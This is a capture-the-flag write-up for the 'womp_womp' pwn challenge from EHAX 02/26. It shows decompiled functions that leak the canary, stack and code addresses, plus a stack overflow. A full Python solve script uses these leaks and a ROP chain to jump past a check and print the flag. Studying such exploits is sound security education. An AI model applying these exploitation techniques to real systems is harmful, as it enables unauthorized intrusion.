+++
date = '2026-03-11T06:41:41+01:00'
draft = false
title = 'EHAX_02_26'
+++


<br>

## PWN

### womp_womp

#### attachments

<a href="/ctf/ehax_02_26/womp_womp/challenge">challenge</a>
<a href="/ctf/ehax_02_26/womp_womp/libcoreio.so">libcoreio.so</a>
<a href="/ctf/ehax_02_26/womp_womp/solve.py">solve.py</a><br><br>

#### reverse

The main call three functions,

The first one which leads to a libc leak, a canary leak and a stack leak
```C
void submit_note(void)

{
  long in_FS_OFFSET;
  undefined1 local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(1,"Input log entry: ",0x11);
  read(0,local_58,0x40);
  write(1,"[LOG] Entry received: ",0x16);
  write(1,local_58,0x58);
  write(1,&DAT_00100ced,1);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

The second one which leads to a code leak

```C
void review_note(void)

{
  long in_FS_OFFSET;
  undefined1 local_38 [32];
  code *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = finalize_note;
  write(1,"Input processing note: ",0x17);
  read(0,local_38,0x20);
  write(1,"[PROC] Processing: ",0x13);
  write(1,local_38,0x30);
  write(1,&DAT_00100ced,1);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

And the third one which is a huge stack overflow

```c
void finalize_entry(void)

{
  long in_FS_OFFSET;
  undefined1 auStack_50 [64];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(1,"Send final payload: ",0x14);
  read(0,auStack_50,400);
  write(1,"[VULN] Done.\n",0xd);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We can't do ret2libc even if we have a libc leak because they don't provide us the libc.

**Hint : we can find libc by leaking addresse and search at [libc.rip](https://libc.rip/). But as they provide another library, it doesn't seems to be the intended way here.**

Let's inspect the provided library
```c

void emit_report(long param_1,long param_2,long param_3)

{
  int __fd;
  size_t __n;
  long in_FS_OFFSET;
  undefined8 local_118;
  undefined8 local_110;
  undefined2 local_108;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  if (((param_1 == -0x2152411021524111) && (param_2 == -0x3501454135014542)) &&
     (param_3 == -0x2ff20ff22ff20ff3)) {
    __fd = open("flag.txt",0);
    if (__fd < 0) {
      local_118 = 0x7478742e67616c66;
      local_110 = 0x676e697373696d20;
      local_108 = 10;
      write(1,&local_118,0x11);
                    /* WARNING: Subroutine does not return */
      _exit(1);
    }
    __n = read(__fd,&local_118,0x100);
    if (0 < (long)__n) {
      write(1,&local_118,__n);
    }
    close(__fd);
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  local_118 = 0x2064696c61766e49;
  local_110 = 0x2e74736575716572;
  local_108 = 10;
  write(1,&local_118,0x11);
                    /* WARNING: Subroutine does not return */
  _exit(1);
}
```
if we can provide the good parameters to emit report, that juste leak the flag
and this function is called in 

```asm
                        bootstrap_state    
00100987 55              PUSH       RBP
00100988 48 89 e5        MOV        RBP,RSP
0010098b 48 83 ec 10     SUB        RSP,0x10
0010098f 48 c7 45        MOV        qword ptr [RBP + local_10],0x1
            f8 01 00 
            00 00
00100997 48 8b 45 f8     MOV        RAX,qword ptr [RBP + local_10]
0010099b 48 85 c0        TEST       RAX,RAX
0010099e 75 14           JNZ        LAB_001009b4
001009a0 ba 00 00        MOV        EDX,0x0
            00 00
001009a5 be 00 00        MOV        ESI,0x0
            00 00
001009aa bf 00 00        MOV        EDI,0x0
            00 00
001009af e8 84 fe        CALL       <EXTERNAL>::emit_report   
            ff ff
                        LAB_001009b4 
001009b4 90              NOP
001009b5 c9              LEAVE
001009b6 c3              RET
```

we can do a ROPchain which call this function and set rdi and rsi but there is no gadget to set rdx...
As said, we can set rdi and rsi, and 'write' and 'emit_report' functions are in the plt so we can leak the libcoreio.so address, and finally call the 'emit_report' function juste after the check.

#### solve

```python

# canary and stack leak
sla(b"log entry", b"a")
rcu(b'received: ')
rcv(8)
leak_libc = l64(rcv(8))
libc_base = leak_libc - (0x00007ffff7a94659 - 0x00007ffff7a0a000)
leak_stack = l64(rcv(8))
base_frame_rip_submit = leak_stack - (0x00007fffffffdb48 - 0x7fffffffda28)
base_frame_rip_main = leak_stack - (0x00007fffffffdb48 - 0x7fffffffda38)
l1 = rcv(6*8)
canary = l64(rcv(8))

# code leak
sla(b"processing", b"a")
rcu(b"Processing: ")
l2 = rcv(4*8)
leak_code = l64(rcv(8))
code_base = leak_code - (0x0000555555400980 - 0x0000555555400000)



pop_rdi = code_base + 0xca3
ret = code_base + 0xca4
write_plt = code_base + 0x810
pop_rsi_r15 = code_base + 0xca1
write_got = code_base + 0x201fb0
read_got = code_base + 0x201fc0
emit_report_got = code_base + 0x201fd8
finalize_entry = code_base + 0xafa

# leak of emit adress via ret2plt with write
# because rdx is not manageable
# and go back to the overflowable function
final_pl = b"a"*64
final_pl += p64(canary)
final_pl += p64(ret)
final_pl += p64(pop_rdi)
final_pl += p64(1)
final_pl += p64(pop_rsi_r15)
final_pl += p64(emit_report_got)
final_pl += p64(0)
final_pl += p64(write_plt)
final_pl += p64(finalize_entry)

sla(b"final payload", final_pl)
rcu(b"[VULN] Done.\n")
leak_emit = l64(rcv(8))

# finally go under the check in the fonction, 
# a valid stack rbp is necessary to open and read the flag
pass_emit_check = leak_emit + 182
final_final_pl = b"a"*64
final_final_pl += p64(canary)
final_final_pl += p64(leak_stack-0x200)
final_final_pl += p64(pass_emit_check)

sla(b"final payload", final_final_pl)


```

```bash
└─$ /bin/python /home/sk4r/.../pwn_womp_womp/solve.py
[*] '/home/sk4r/.../pwn_womp_womp/challenge_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RPATH:      b'.'
    Stripped:   No
[VULN] Done.
FLAG{REDACTED}
```

Thx.
<br>
Sk4r.
